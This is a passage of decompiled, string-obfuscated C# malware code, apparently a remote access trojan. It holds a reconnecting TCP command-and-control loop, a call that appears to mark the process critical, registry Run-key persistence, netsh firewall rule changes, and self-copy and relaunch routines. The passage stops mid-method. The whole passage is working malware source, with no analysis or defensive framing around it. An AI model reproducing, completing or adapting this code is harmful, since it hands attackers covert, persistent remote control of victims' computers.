			string text = string_11.Replace(Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, GClass4.smethod_0("ZŢɡ\u036cѷշ\u0670ݸ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("HŦɨͻѴգٶݖ\u086c७\u0a75"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("JŢɯ\u0364"), new object[0], (string[])null, (Type[])null, (bool[])null), (object)GClass4.smethod_0("]"))), GClass4.smethod_0(""));
			object obj = NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, GClass4.smethod_0("ZŢɡ\u036cѷշ\u0670ݸ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("HŦɨͻѴգٶݖ\u086c७\u0a75"), new object[0], (string[])null, (Type[])null, (bool[])null);
			string text2 = GClass4.smethod_0("EŹɭ\u0369ѕհ٦\u0748ࡧॸ");
			object[] array = new object[2] { text, true };
			object[] array2 = array;
			bool[] array3 = new bool[2] { true, false };
			object obj2 = NewLateBinding.LateGet(obj, (Type)null, text2, array2, (string[])null, (Type[])null, array3);
			if (array3[0])
			{
				text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			return (RegistryKey)obj2;
		}
		if (string_11.StartsWith(Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, GClass4.smethod_0("ZŢɡ\u036cѷշ\u0670ݸ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("HſɻͺѢըٱݑ\u0870१ੳ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("JŢɯ\u0364"), new object[0], (string[])null, (Type[])null, (bool[])null))))
		{
			string text = string_11.Replace(Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, GClass4.smethod_0("ZŢɡ\u036cѷշ\u0670ݸ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("HſɻͺѢըٱݑ\u0870१ੳ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("JŢɯ\u0364"), new object[0], (string[])null, (Type[])null, (bool[])null), (object)GClass4.smethod_0("]"))), GClass4.smethod_0(""));
			object obj3 = NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, GClass4.smethod_0("ZŢɡ\u036cѷշ\u0670ݸ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("HſɻͺѢըٱݑ\u0870१ੳ"), new object[0], (string[])null, (Type[])null, (bool[])null);
			string text3 = GClass4.smethod_0("EŹɭ\u0369ѕհ٦\u0748ࡧॸ");
			object[] array4 = new object[2] { text, true };
			object[] array5 = array4;
			bool[] array3 = new bool[2] { true, false };
			object obj4 = NewLateBinding.LateGet(obj3, (Type)null, text3, array5, (string[])null, (Type[])null, array3);
			if (array3[0])
			{
				text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[0]), typeof(string));
			}
			return (RegistryKey)obj4;
		}
		if (string_11.StartsWith(Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, GClass4.smethod_0("ZŢɡ\u036cѷշ\u0670ݸ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("@Ťɩ\u0368ѤՊ٧ݦ\u086c४੬\u0b64"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("JŢɯ\u0364"), new object[0], (string[])null, (Type[])null, (bool[])null))))
		{
			string text = string_11.Replace(Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, GClass4.smethod_0("ZŢɡ\u036cѷշ\u0670ݸ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("@Ťɩ\u0368ѤՊ٧ݦ\u086c४੬\u0b64"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("JŢɯ\u0364"), new object[0], (string[])null, (Type[])null, (bool[])null), (object)GClass4.smethod_0("]"))), GClass4.smethod_0(""));
			object obj5 = NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, GClass4.smethod_0("ZŢɡ\u036cѷշ\u0670ݸ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("@Ťɩ\u0368ѤՊ٧ݦ\u086c४੬\u0b64"), new object[0], (string[])null, (Type[])null, (bool[])null);
			string text4 = GClass4.smethod_0("EŹɭ\u0369ѕհ٦\u0748ࡧॸ");
			object[] array4 = new object[2] { text, true };
			object[] array6 = array4;
			bool[] array3 = new bool[2] { true, false };
			object obj6 = NewLateBinding.LateGet(obj5, (Type)null, text4, array6, (string[])null, (Type[])null, array3);
			if (array3[0])
			{
				text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[0]), typeof(string));
			}
			return (RegistryKey)obj6;
		}
		if (string_11.StartsWith(Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, GClass4.smethod_0("ZŢɡ\u036cѷշ\u0670ݸ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("PŷɦͰѲ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("JŢɯ\u0364"), new object[0], (string[])null, (Type[])null, (bool[])null))))
		{
			string text = string_11.Replace(Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, GClass4.smethod_0("ZŢɡ\u036cѷշ\u0670ݸ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("PŷɦͰѲ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("JŢɯ\u0364"), new object[0], (string[])null, (Type[])null, (bool[])null), (object)GClass4.smethod_0("]"))), GClass4.smethod_0(""));
			object obj7 = NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, GClass4.smethod_0("ZŢɡ\u036cѷշ\u0670ݸ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("PŷɦͰѲ"), new object[0], (string[])null, (Type[])null, (bool[])null);
			string text5 = GClass4.smethod_0("EŹɭ\u0369ѕհ٦\u0748ࡧॸ");
			object[] array4 = new object[2] { text, true };
			object[] array7 = array4;
			bool[] array3 = new bool[2] { true, false };
			object obj8 = NewLateBinding.LateGet(obj7, (Type)null, text5, array7, (string[])null, (Type[])null, array3);
			if (array3[0])
			{
				text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[0]), typeof(string));
			}
			return (RegistryKey)obj8;
		}
		return null;
	}

	public void method_23(int int_0)
	{
		try
		{
			NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref int_0, 4);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_24(byte[] byte_0)
	{
		if (!bool_2)
		{
			return;
		}
		try
		{
			object obj = new MemoryStream();
			string text = GClass4.smethod_0("RŶɪͶѤ");
			object[] array = new object[3] { byte_0, 0, byte_0.Length };
			object[] array2 = array;
			bool[] array3 = new bool[3] { true, false, false };
			NewLateBinding.LateCall(obj, (Type)null, text, array2, (string[])null, (Type[])null, array3, true);
			if (array3[0])
			{
				byte_0 = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(byte[]));
			}
			NewLateBinding.LateCall(obj, (Type)null, GClass4.smethod_0("RŶɪͶѤ"), new object[3]
			{
				method_9(ref string_9),
				0,
				string_9.Length
			}, (string[])null, (Type[])null, (bool[])null, true);
			object obj2 = NewLateBinding.LateGet(object_2, (Type)null, GClass4.smethod_0("Eũɭ\u0366Ѭյ"), new object[0], (string[])null, (Type[])null, (bool[])null);
			string text2 = GClass4.smethod_0("WŦɬ\u0365");
			array = new object[4];
			object[] array4 = array;
			object obj3 = obj;
			array4[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj3, (Type)null, GClass4.smethod_0("SũɄͶѱգٸ"), new object[0], (string[])null, (Type[])null, (bool[])null));
			array[1] = 0;
			object[] array5 = array;
			object obj4 = obj;
			array5[2] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj4, (Type)null, GClass4.smethod_0("JŠɪ\u0364Ѷթ"), new object[0], (string[])null, (Type[])null, (bool[])null));
			array[3] = SocketFlags.None;
			object[] array6 = array;
			object[] array7 = array6;
			array3 = new bool[4] { true, false, true, false };
			NewLateBinding.LateCall(obj2, (Type)null, text2, array7, (string[])null, (Type[])null, array3, true);
			if (array3[0])
			{
				NewLateBinding.LateSetComplex(obj3, (Type)null, GClass4.smethod_0("SũɄͶѱգٸ"), new object[1] { RuntimeHelpers.GetObjectValue(array6[0]) }, (string[])null, (Type[])null, true, false);
			}
			if (array3[2])
			{
				NewLateBinding.LateSetComplex(obj4, (Type)null, GClass4.smethod_0("JŠɪ\u0364Ѷթ"), new object[1] { RuntimeHelpers.GetObjectValue(array6[2]) }, (string[])null, (Type[])null, true, false);
			}
			NewLateBinding.LateCall(obj, (Type)null, GClass4.smethod_0("CůɶʹѬձ٤"), new object[0], (string[])null, (Type[])null, (bool[])null, true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool_2 = false;
			ProjectData.ClearProjectError();
		}
	}

	public void method_25(string string_11)
	{
		method_24(method_9(ref string_11));
	}

	public void method_26()
	{
		object obj = new MemoryStream();
		int num = 0;
		checked
		{
			while (true)
			{
				try
				{
					if (object_2 != null && !Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(NewLateBinding.LateGet(object_2, (Type)null, GClass4.smethod_0("Eũɭ\u0366Ѭյ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("Jŧɩ\u0368Ѡէٷݧࡥ"), new object[0], (string[])null, (Type[])null, (bool[])null), (object)false, false) && bool_2)
					{
						num++;
						if (num <= 500)
						{
							goto IL_0172;
						}
						num = 0;
						if (!Conversions.ToBoolean(Operators.AndObject(NewLateBinding.LateGet(NewLateBinding.LateGet(object_2, (Type)null, GClass4.smethod_0("Eũɭ\u0366Ѭյ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("TŬɮ\u036d"), new object[2]
						{
							-1,
							SelectMode.SelectRead
						}, (string[])null, (Type[])null, (bool[])null), Operators.CompareObjectLessEqual(NewLateBinding.LateGet(NewLateBinding.LateGet(object_2, (Type)null, GClass4.smethod_0("Eũɭ\u0366Ѭյ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("Hžɦ\u036fѩե١ݮࡤ"), new object[0], (string[])null, (Type[])null, (bool[])null), (object)0, false))))
						{
							goto IL_0172;
						}
					}
					goto end_IL_000c;
					IL_0172:
					if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(object_2, (Type)null, GClass4.smethod_0("Hžɦ\u036fѩե١ݮࡤ"), new object[0], (string[])null, (Type[])null, (bool[])null), (object)0, false))
					{
						byte[] array = new byte[Conversions.ToInteger(Operators.SubtractObject(NewLateBinding.LateGet(object_2, (Type)null, GClass4.smethod_0("Hžɦ\u036fѩե١ݮࡤ"), new object[0], (string[])null, (Type[])null, (bool[])null), (object)1)) + 1];
						object obj2 = NewLateBinding.LateGet(object_2, (Type)null, GClass4.smethod_0("Eũɭ\u0366Ѭյ"), new object[0], (string[])null, (Type[])null, (bool[])null);
						string text = GClass4.smethod_0("Uţɦ\u0361Ѫմ٤");
						object[] array2 = new object[4]
						{
							array,
							0,
							array.Length,
							SocketFlags.None
						};
						object[] array3 = array2;
						bool[] array4 = new bool[4] { true, false, false, false };
						NewLateBinding.LateCall(obj2, (Type)null, text, array3, (string[])null, (Type[])null, array4, true);
						if (array4[0])
						{
							array = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(byte[]));
						}
						object obj3 = obj;
						string text2 = GClass4.smethod_0("RŶɪͶѤ");
						object[] array5 = new object[3] { array, 0, array.Length };
						object[] array6 = array5;
						array4 = new bool[3] { true, false, false };
						NewLateBinding.LateCall(obj3, (Type)null, text2, array6, (string[])null, (Type[])null, array4, true);
						if (array4[0])
						{
							array = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(byte[]));
						}
						while (true)
						{
							object obj4 = obj;
							byte[] byte_ = (byte[])NewLateBinding.LateGet(obj4, (Type)null, GClass4.smethod_0("SũɄͶѱգٸ"), new object[0], (string[])null, (Type[])null, (bool[])null);
							string text3 = method_10(ref byte_);
							NewLateBinding.LateSetComplex(obj4, (Type)null, GClass4.smethod_0("SũɄͶѱգٸ"), new object[1] { byte_ }, (string[])null, (Type[])null, true, false);
							if (text3.Contains(string_9))
							{
								Array array7 = method_11((byte[])NewLateBinding.LateGet(obj, (Type)null, GClass4.smethod_0("SũɄͶѱգٸ"), new object[0], (string[])null, (Type[])null, (bool[])null), string_9);
								Thread thread = new Thread(delegate(object object_4)
								{
									method_21((byte[])object_4);
								});
								thread.Start(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array7, new object[1] { 0 }, (string[])null)));
								NewLateBinding.LateCall(obj, (Type)null, GClass4.smethod_0("CůɶʹѬձ٤"), new object[0], (string[])null, (Type[])null, (bool[])null, true);
								obj = new MemoryStream();
								if (array7.Length == 2)
								{
									object obj5 = obj;
									string text4 = GClass4.smethod_0("RŶɪͶѤ");
									object[] array8 = new object[3];
									array5 = new object[1];
									object[] array9 = array5;
									int num2 = 1;
									array9[0] = 1;
									array8[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array7, array5, (string[])null));
									array8[1] = 0;
									object[] array10 = new object[1];
									array2 = array10;
									object[] array11 = array2;
									int num3 = 0;
									obj4 = 1;
									array11[0] = RuntimeHelpers.GetObjectValue(obj4);
									object[] array12 = array2;
									string[] array13 = null;
									array8[2] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(NewLateBinding.LateIndexGet((object)array7, array12, array13), (Type)null, GClass4.smethod_0("jŠɪ\u0364Ѷթ"), new object[0], (string[])null, (Type[])null, (bool[])null));
									object[] array14 = array8;
									array4 = new bool[3] { true, false, true };
									NewLateBinding.LateCall(obj5, (Type)null, text4, array14, (string[])null, (Type[])null, array4, true);
									if (array4[0])
									{
										NewLateBinding.LateIndexSetComplex((object)array7, new object[2]
										{
											num2,
											RuntimeHelpers.GetObjectValue(array14[0])
										}, (string[])null, true, false);
									}
									if (array4[2])
									{
										array2 = array10;
										array2[num3] = RuntimeHelpers.GetObjectValue(obj4);
										NewLateBinding.LateSetComplex(NewLateBinding.LateIndexGet((object)array7, array12, array13), (Type)null, GClass4.smethod_0("jŠɪ\u0364Ѷթ"), new object[1] { RuntimeHelpers.GetObjectValue(array14[2]) }, (string[])null, (Type[])null, true, true);
									}
									continue;
								}
								break;
							}
							break;
						}
					}
					goto IL_0b30;
					end_IL_000c:;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				while (true)
				{
					bool_2 = false;
					try
					{
						NewLateBinding.LateCall(NewLateBinding.LateGet(object_2, (Type)null, GClass4.smethod_0("Eũɭ\u0366Ѭյ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("NŠɻ\u0364ѩի٪ݦࡡॵ"), new object[1] { false }, (string[])null, (Type[])null, (bool[])null, true);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					try
					{
						NewLateBinding.LateCall(obj, (Type)null, GClass4.smethod_0("CůɶʹѬձ٤"), new object[0], (string[])null, (Type[])null, (bool[])null, true);
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					obj = new MemoryStream();
					try
					{
						NewLateBinding.LateCall(object_1, (Type)null, GClass4.smethod_0("OŪɮ\u036d"), new object[0], (string[])null, (Type[])null, (bool[])null, true);
						object_1 = null;
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					try
					{
						object_2 = new TcpClient();
						NewLateBinding.LateSet(object_2, (Type)null, GClass4.smethod_0("\\Ũɯ\u036eѣտ٭ݓ\u086f२\u0a61୬౷൵"), new object[1] { -1 }, (string[])null, (Type[])null);
						NewLateBinding.LateSet(object_2, (Type)null, GClass4.smethod_0("Xůɧ\u036cѓկ٨ݡ\u086cॷ\u0a75"), new object[1] { -1 }, (string[])null, (Type[])null);
						NewLateBinding.LateSet(object_2, (Type)null, GClass4.smethod_0("]Ũɢ\u036fшռٮݡࡣॷ\u0a57୪౸\u0d64"), new object[1] { 999999 }, (string[])null, (Type[])null);
						NewLateBinding.LateSet(object_2, (Type)null, GClass4.smethod_0("Cŵɬ\u036bѤպٮ\u0748\u087c८\u0a61\u0b63౷\u0d57\u0e6a\u0f78\u1064"), new object[1] { 999999 }, (string[])null, (Type[])null);
						NewLateBinding.LateSetComplex(NewLateBinding.LateGet(object_2, (Type)null, GClass4.smethod_0("Eũɭ\u0366Ѭյ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("]Ũɢ\u036fшռٮݡࡣॷ\u0a57୪౸\u0d64"), new object[1] { 999999 }, (string[])null, (Type[])null, false, true);
						NewLateBinding.LateSetComplex(NewLateBinding.LateGet(object_2, (Type)null, GClass4.smethod_0("Eũɭ\u0366Ѭյ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("Cŵɬ\u036bѤպٮ\u0748\u087c८\u0a61\u0b63౷\u0d57\u0e6a\u0f78\u1064"), new object[1] { 999999 }, (string[])null, (Type[])null, false, true);
						num = 0;
						object obj6 = NewLateBinding.LateGet(object_2, (Type)null, GClass4.smethod_0("Eũɭ\u0366Ѭյ"), new object[0], (string[])null, (Type[])null, (bool[])null);
						string text5 = GClass4.smethod_0("Dũɫ\u036aѦաٵ");
						object[] array15 = new object[2] { string_6, string_7 };
						object[] array16 = array15;
						bool[] array4 = new bool[2] { true, true };
						NewLateBinding.LateCall(obj6, (Type)null, text5, array16, (string[])null, (Type[])null, array4, true);
						if (array4[0])
						{
							string_6 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array15[0]), typeof(string));
						}
						if (array4[1])
						{
							string_7 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array15[1]), typeof(string));
						}
						bool_2 = true;
						method_25(method_4());
						try
						{
							if (Operators.CompareString(method_2(GClass4.smethod_0("wŲ")), GClass4.smethod_0(" "), false) == 0)
							{
								method_25(new string(new char[2] { 'u', 's' }));
							}
						}
						catch (Exception projectError5)
						{
							ProjectData.SetProjectError(projectError5);
							bool_2 = false;
							ProjectData.ClearProjectError();
						}
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						Thread.Sleep(2500);
						ProjectData.ClearProjectError();
						continue;
					}
					break;
				}
				continue;
				IL_0b30:
				Thread.Sleep(1);
			}
		}
	}

	public void method_27()
	{
		method_23(0);
		gclass0_0.method_1();
		try
		{
			object obj = NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, GClass4.smethod_0("ZŢɡ\u036cѷշ\u0670ݸ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("HſɻͺѢըٱݑ\u0870१ੳ"), new object[0], (string[])null, (Type[])null, (bool[])null);
			string text = GClass4.smethod_0("EŹɭ\u0369ѕհ٦\u0748ࡧॸ");
			object[] array = new object[2] { string_10, true };
			object[] array2 = array;
			bool[] array3 = new bool[2] { true, false };
			object obj2 = NewLateBinding.LateGet(obj, (Type)null, text, array2, (string[])null, (Type[])null, array3);
			if (array3[0])
			{
				string_10 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			string text2 = GClass4.smethod_0("Oůɥ\u036dѳգ\u0653ݥ\u086fॷ\u0a64");
			object[] array4 = new object[2] { string_5, false };
			object[] array5 = array4;
			bool[] array6 = new bool[2] { true, false };
			NewLateBinding.LateCall(obj2, (Type)null, text2, array5, (string[])null, (Type[])null, array6, true);
			if (array6[0])
			{
				string_5 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[0]), typeof(string));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			object obj3 = NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, GClass4.smethod_0("ZŢɡ\u036cѷշ\u0670ݸ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("@Ťɩ\u0368ѤՊ٧ݦ\u086c४੬\u0b64"), new object[0], (string[])null, (Type[])null, (bool[])null);
			string text3 = GClass4.smethod_0("EŹɭ\u0369ѕհ٦\u0748ࡧॸ");
			object[] array7 = new object[2] { string_10, true };
			object[] array8 = array7;
			bool[] array6 = new bool[2] { true, false };
			object obj4 = NewLateBinding.LateGet(obj3, (Type)null, text3, array8, (string[])null, (Type[])null, array6);
			if (array6[0])
			{
				string_10 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[0]), typeof(string));
			}
			string text4 = GClass4.smethod_0("Oůɥ\u036dѳգ\u0653ݥ\u086fॷ\u0a64");
			object[] array9 = new object[2] { string_5, false };
			object[] array10 = array9;
			bool[] array3 = new bool[2] { true, false };
			NewLateBinding.LateCall(obj4, (Type)null, text4, array10, (string[])null, (Type[])null, array3, true);
			if (array3[0])
			{
				string_5 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array9[0]), typeof(string));
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)(new string(new char[37]
			{
				'n', 'e', 't', 's', 'h', ' ', 'f', 'i', 'r', 'e',
				'w', 'a', 'l', 'l', ' ', 'd', 'e', 'l', 'e', 't',
				'e', ' ', 'a', 'l', 'l', 'o', 'w', 'e', 'd', 'p',
				'r', 'o', 'g', 'r', 'a', 'm', ' '
			}) + GClass4.smethod_0("#")), NewLateBinding.LateGet(object_0, (Type)null, GClass4.smethod_0("NŲɪ\u0369ъբٯݤ"), new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"')), (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + GClass4.smethod_0("]") + string_5 + GClass4.smethod_0("*Ŧɺ\u0364");
			File.Delete(path);
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			object obj5 = NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, GClass4.smethod_0("ZŢɡ\u036cѷշ\u0670ݸ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("HſɻͺѢըٱݑ\u0870१ੳ"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("EŹɭ\u0369ѕհ٦\u0748ࡧॸ"), new object[2]
			{
				new char[8] { 'S', 'o', 'f', 't', 'w', 'a', 'r', 'e' },
				true
			}, (string[])null, (Type[])null, (bool[])null);
			string text5 = GClass4.smethod_0("HŮɦ\u036cѼբ\u0655ݰࡦ\u0948੧\u0b78");
			object[] array = new object[2] { string_5, false };
			object[] array11 = array;
			bool[] array6 = new bool[2] { true, false };
			NewLateBinding.LateCall(obj5, (Type)null, text5, array11, (string[])null, (Type[])null, array6, true);
			if (array6[0])
			{
				string_5 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)GClass4.smethod_0("zŵɳ\u0338Ѱլٶ\u0732࠾ॻਯ\u0b7e\u0c64\u0d62\u0e6c༪\u1039ᄨሡጦᑡᕡᙯᜢᠣ"), NewLateBinding.LateGet(object_0, (Type)null, GClass4.smethod_0("NŲɪ\u0369ъբٯݤ"), new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)GClass4.smethod_0("'Ġȥ\u0361ѻիٵ"))), (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		ProjectData.EndApp();
	}

	private bool method_28(FileInfo fileInfo_0, FileInfo fileInfo_1)
	{
		if (Operators.CompareString(fileInfo_0.get_Name().ToLower(), fileInfo_1.get_Name().ToLower(), false) != 0)
		{
			return false;
		}
		DirectoryInfo directoryInfo = fileInfo_0.Directory;
		DirectoryInfo directoryInfo2 = fileInfo_1.Directory;
		do
		{
			if (Operators.CompareString(directoryInfo.get_Name().ToLower(), directoryInfo2.get_Name().ToLower(), false) == 0)
			{
				directoryInfo = directoryInfo.Parent;
				directoryInfo2 = directoryInfo2.Parent;
				if (!(directoryInfo == null && directoryInfo2 == null))
				{
					if (directoryInfo == null)
					{
						return false;
					}
					continue;
				}
				return true;
			}
			return false;
		}
		while (directoryInfo2 != null);
		return false;
	}

	public void method_29()
	{
		if (!method_28((FileInfo)object_0, new FileInfo(Interaction.Environ(string_4).ToLower() + new string(new char[1] { '\\' }) + string_3.ToLower())))
		{
			try
			{
				if (Operators.CompareString(method_2(GClass4.smethod_0("wŲ")), GClass4.smethod_0(""), false) == 0)
				{
					if (Conversions.ToBoolean(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(object_0, (Type)null, GClass4.smethod_0("Mšɵ\u0363Ѧհ٬ݰ\u0878"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("JŢɯ\u0364"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("KŨɨͱѥժ٬ݲ"), new object[1] { new char[1] { ':' } }, (string[])null, (Type[])null, (bool[])null)))
					{
						method_3(GClass4.smethod_0("WŒ"), GClass4.smethod_0(" "));
					}
					else
					{
						method_3(GClass4.smethod_0("WŒ"), GClass4.smethod_0("A"));
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			try
			{
				string string_ = GClass4.smethod_0("IīɌ\u035fрԧاݗࡁण੦୷\u0c44\u0d64\u0e37ཬ\u1058ᄻሿፏᑙᔷ᙮ᝃᡕ\u1933\u1a76᭕");
				Environment.SetEnvironmentVariable(method_7(ref string_), GClass4.smethod_0("0"), EnvironmentVariableTarget.User);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			try
			{
				if (File.Exists(Interaction.Environ(string_4) + GClass4.smethod_0("]") + string_3))
				{
					File.Delete(Interaction.Environ(string_4) + GClass4.smethod_0("]") + string_3);
				}
				File.Copy(Conversions.ToString(NewLateBinding.LateGet(object_0, (Type)null, GClass4.smethod_0("NŲɪ\u0369ъբٯݤ"), new object[0], (string[])null, (Type[])null, (bool[])null)), Interaction.Environ(string_4) + new string(new char[1] { '\\' }) + string_3, overwrite: true);
				Process.Start(Interaction.Environ(string_4) + new string(new char[1] { '\\' }) + string_3);
				ProjectData.EndApp();
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.EndApp();
				ProjectData.ClearProjectError();
			}
		}
		try
		{
			Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)GClass4.smethod_0("MŇɕ\u0353ѷԾٻݵࡩॿ੮\u0b79౻ൺ\u0e35\u0f75ၷᅶሱ፱ᑣᕢᙢ\u177bᡮ\u196e\u1a79᭺ᱨᵡṷὥ\u206e™∣"), NewLateBinding.LateGet(object_0, (Type)null, GClass4.smethod_0("NŲɪ\u0369ъբٯݤ"), new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)GClass4.smethod_0("!")), (object)'"'), NewLateBinding.LateGet(object_0, (Type)null, GClass4.smethod_0("JŢɯ\u0364"), new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)GClass4.smethod_0("'Ńɋ\u0345сՎل"))), (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
